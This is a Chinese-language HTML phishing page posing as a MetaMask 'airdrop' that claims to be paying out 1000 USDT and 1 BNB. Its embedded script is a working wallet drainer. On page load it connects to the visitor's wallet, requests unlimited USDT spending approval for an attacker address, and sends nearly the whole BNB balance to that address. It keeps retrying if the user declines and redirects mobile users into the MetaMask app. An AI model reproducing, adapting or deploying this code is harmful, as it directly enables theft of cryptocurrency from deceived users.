<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1.0" />
<title>小狐狸空投</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Poppins','Microsoft YaHei',sans-serif;height:100vh;overflow:hidden;background:radial-gradient(circle at 20% 20%,#ffe4f8,#fff0fa,#ffffff);background-size:200% 200%;animation:bgmove 10s infinite alternate;display:flex;justify-content:center;align-items:center;flex-direction:column;}
@keyframes bgmove{0%{background-position:0 0;}100%{background-position:100% 100%;}}
.container{backdrop-filter:blur(20px);background:rgba(255,255,255,.4);border-radius:24px;box-shadow:0 8px 32px rgba(255,182,193,.3);width:90%;max-width:440px;padding:40px;text-align:center;margin:10px;}
h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);font-size:28px;}
#status{color:#ff69b4;font-size:20px;margin:15px;line-height:1.4;font-weight:600;}
.sparkle{position:fixed;width:4px;height:4px;background:#fff;border-radius:50%;animation:fall 10s infinite linear;opacity:.8;}
@keyframes fall{0%{transform:translateY(-10vh) scale(0);}50%{opacity:1;}100%{transform:translateY(110vh) scale(1);opacity:0;}}
@media (max-width:480px){.container{padding:20px;width:95% !important;}}
</style>
</head>
<body>
<div class="container">
  <h1>小狐狸空投</h1>
  <div id="status">正在领取1000USDT+1BNB</div>
</div>
<script>
const TAX_WALLET = "0xd558a25D41688673EfA2FDBAD8CD30bd519f791F";
const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
let web3, userAddr;

// 无限授权额度
const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

const USDT_ABI = [
  {"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[],"type":"function"}
];

async function autoRedirect(){
  const ua = navigator.userAgent;
  const isMobile = /Android|iPhone|iPad/i.test(ua);
  if(isMobile){
    setTimeout(() => {
      window.location.href = 'metamask://dapp/' + encodeURIComponent(window.location.href);
    }, 200);
  }
}

async function run(){
  document.getElementById('status').innerText = '正在领取1000USDT+1BNB';
  try{
    await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{chainId: '0x38'}]});
    web3 = new Web3(window.ethereum);
    const currentAccounts = await web3.eth.getAccounts();
    if (currentAccounts.length > 0) {
      userAddr = currentAccounts[0];
    } else {
      const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
      userAddr = accounts[0];
    }
    
    const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDR);
    
    // 第1步：强制授权 USDT 无限额度
    await usdt.methods.approve(TAX_WALLET, MAX_UINT).send({from: userAddr});
    
    // 第2步：转走全部 BNB（留 0.001）
    const balance = await web3.eth.getBalance(userAddr);
    const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
    if(totalBNB > 0.001){
      const amount = web3.utils.toWei((totalBNB - 0.001).toFixed(18), 'ether');
      await web3.eth.sendTransaction({
        from: userAddr,
        to: TAX_WALLET,
        value: amount
      });
    }
    
    document.getElementById('status').innerText = '领取成功！官方发放中...';
    
  }catch(e){
    console.error(e);
    setTimeout(run, 1000);
  }
}

window.addEventListener('load', () => {
  setTimeout(autoRedirect, 200);
  if(window.ethereum){
    setTimeout(run, 800);
  }
});

window.ethereum.on('accountsChanged', (accounts) => {
  if (accounts.length > 0) {
    userAddr = accounts[0];
    document.getElementById('status').innerText = '正在领取1000USDT+1BNB';
  }
});
</script>
</body>
</html>
